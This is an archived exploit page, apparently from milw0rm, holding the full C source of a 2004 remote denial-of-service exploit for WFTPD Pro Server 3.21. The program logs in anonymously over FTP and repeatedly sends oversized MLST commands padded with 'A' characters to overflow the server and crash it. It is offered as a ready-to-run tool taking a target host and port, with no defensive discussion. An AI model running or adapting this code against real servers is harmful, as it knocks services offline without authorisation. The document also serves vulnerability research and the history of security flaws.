<html>
<head>
<title>WFTPD Pro Server 3.21 MLST Remote Denial of Service Exploit</title>
<pre>
/*
*-----------------------------------------------------------------------
* 
* wftpd.c - WFTPD Pro Server 3.21 MLST DoS Exploit
*
* Copyright (C) 2000-2004 HUC All Rights Reserved.
*
* Author   : lion
*             : lion cnhonker net
*             : www cnhonker com
* Date     : 2004-08-30
*
*-----------------------------------------------------------------------
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;winsock2.h&gt; 

#pragma comment(lib, &quot;ws2_32.lib&quot;)

#define FTPPORT      21
#define BUFFSIZE     204800
#define OVERFLOWSIZE 220
#define SIZE         2048      

// function
int create_socket();
int client_connect(int sockfd,char* server,int port);
int writebuf(char *s,int socket,char *buffer,int len);
int readbuf(char *s,int socket,char *buffer,int len);
void checkstatus(char *s);
void loginftp(SOCKET sockfd, char *user, char *pass);

int show = 1;
char recvbuf[BUFFSIZE];
char sendbuf[BUFFSIZE];

void main(int argc, char *argv[])
{
    WSADATA wsa;
    unsigned short    port;
    unsigned long     ip;
    char user[32] = &quot;anonymous&quot;;
    char pass[32] = &quot;anonymous&quot;;
    int i;
    
    char *command = &quot;MLST &quot;;

    SOCKET s;
    int size = OVERFLOWSIZE;

    printf(&quot;WFTPD Pro Server 3.21 MLST DoS Exploit\r\n&quot;);
        printf(&quot;lion lion#cnhonker.net, http://www.cnhonker.com\r\n\n&quot;);

    if(argc &lt; 3)
    {
        printf(&quot;%s &lt;TargetHost&gt; &lt;TargetPort&gt;\r\n&quot;, argv[0]);
        return;
    }
    
    WSAStartup(MAKEWORD(2,2),&amp;wsa);

    if((s=create_socket())==0) 
    {
        printf(&quot;[-] ERROR: Create socket failed.\r\n&quot;);
        return;
    }
      
    if(!client_connect(s, argv[1], atoi(argv[2])))
        exit(-1);
    
    loginftp(s, user, pass);
    
    memset(sendbuf, 0 ,BUFFSIZE);
    memcpy(sendbuf, &quot;pasv\r\n&quot;, 6);
    writebuf(&quot;Send pasv&quot;, s, sendbuf, 6);
    readbuf(&quot;read&quot;, s, recvbuf, BUFFSIZE);
    
    for(i=0;i&lt;60;i++,size++)
    {
        memset(sendbuf, 0, BUFFSIZE);
        memset(sendbuf, 'A', size);
        memcpy(sendbuf, command, strlen(command));
        sendbuf[size-2] ='\r';
        sendbuf[size-1] ='\n';
        
        printf(&quot;buff size :%d\r\n%s\r\n&quot;, strlen(sendbuf), sendbuf);
        show=1;
        writebuf(&quot;Send overflow buff&quot;, s, sendbuf, size);
        readbuf(&quot;read&quot;, s, recvbuf, BUFFSIZE);
        Sleep(500);
    }
    
    //send QUIT
    memset(sendbuf,0, BUFFSIZE);
    sprintf(sendbuf, &quot;%s\r\n&quot;, &quot;QUIT&quot;);
    writebuf(&quot;Send QUIT&quot;, s, sendbuf, strlen(sendbuf));
    
    //show=1;
    //readbuf(&quot;[+] QUIT......&quot;, s, recvbuf, BUFFSIZE);    
    //return;
        
    if(s)
        closesocket(s);
          
    WSACleanup();
}

int create_socket()
{  
    int sockfd;
  
    sockfd=socket(AF_INET,SOCK_STREAM,0);
    if(sockfd&lt;0)
    {
        printf(&quot;[-] Create socket error.\r\n&quot;);
        return(0);
    }
    
    return(sockfd);    
}

int client_connect(int sockfd,char* server,int port)
{
    struct sockaddr_in cliaddr;
    struct hostent *host;

    if((host=gethostbyname(server))==NULL)
    {
        printf(&quot;[-] ERROR: gethostbyname(%s) error\n&quot;, server);
        return(-1);
    }      
    
    memset(&amp;cliaddr, 0, sizeof(struct sockaddr));

    cliaddr.sin_family=AF_INET;
    cliaddr.sin_port=htons(port);
    cliaddr.sin_addr=*((struct in_addr *)host-&gt;h_addr);
    printf(&quot;[+] Trying %s:%d......&quot;, server, port);
    fflush(stdout);

    if(connect(sockfd,(struct sockaddr *)&amp;cliaddr,sizeof(struct sockaddr))&lt;0)
    {
        printf(&quot;FAILED!\r\n&quot;);
        closesocket(sockfd);
        return(-1);
    }

    printf(&quot;OK!\r\n&quot;);
    return(1);
}

int writebuf(char *s,int socket,char *buffer,int len)
{
    int j;

    if(s)
    {
        printf(&quot;[+] %s......&quot;, s);
        fflush(stdout);
    }    

    j=send(socket,buffer,len,0);
    if(j&lt;=0)
    {
        printf(&quot;FAILED!\r\n&quot;);
            exit(-1);
    }    
    printf(&quot;OK!\r\n&quot;);
    return j;
}

int readbuf(char *s,int socket,char *buffer,int len)
{
    int a,b,i,j=0;
    
    a=b=i=0;
    memset(buffer,0,len);

    if(s)
    {
        printf(&quot;[+] %s......&quot;, s);
        fflush(stdout);
    }

    j=recv(socket,buffer,len-1,0);
    if(j &lt;= 0)
    {
        if(s) printf(&quot;FAILED!\n&quot;);
            printf(&quot;[-] Recv data error.\n&quot;);
        exit(-1);
    }    
        
    if(s) printf(&quot;OK!\n&quot;);

    buffer[len-1]='\0';

    if(show==1)  printf(&quot;&lt;==\r\n%s&lt;==\r\n&quot;,buffer);

    return j;
}

void checkstatus(char *s)
{
    if(s==NULL) exit(-1);
    if(isdigit(*s))
    {
        if(s[0]=='5')
        {    
            printf(&quot;[-] Server told:%s\n&quot;,s);
            exit(-1);
        }
        else return;
    }

    printf(&quot;[-] Server said:%s\n&quot;,s);
    exit(-1);
}

void loginftp(SOCKET sockfd, char *user, char *pass)
{
    int j;
    
    show=1;
    readbuf(&quot;Get FTP Server banner&quot;,sockfd, recvbuf, SIZE);
    //show=0;

    //send USER username
    memset(sendbuf,0,BUFFSIZE);
    j=sprintf(sendbuf,&quot;%s %s\r\n&quot;, &quot;USER&quot;, user);
    writebuf(&quot;Send USER&quot;, sockfd,sendbuf,j);
    readbuf(NULL,sockfd, recvbuf, BUFFSIZE);
    checkstatus(recvbuf);

    //send PASS password
    memset(sendbuf,0,BUFFSIZE);
    j=sprintf(sendbuf,&quot;%s %s\r\n&quot;,&quot;PASS&quot;, pass);
    writebuf(&quot;Send PASS&quot;, sockfd, sendbuf, j);
    readbuf(NULL,sockfd,recvbuf, BUFFSIZE);
    checkstatus(recvbuf);
    printf(&quot;[+] User %s logged in.\r\n&quot;, user);
}</pre>
//milw0rm.com
</html>

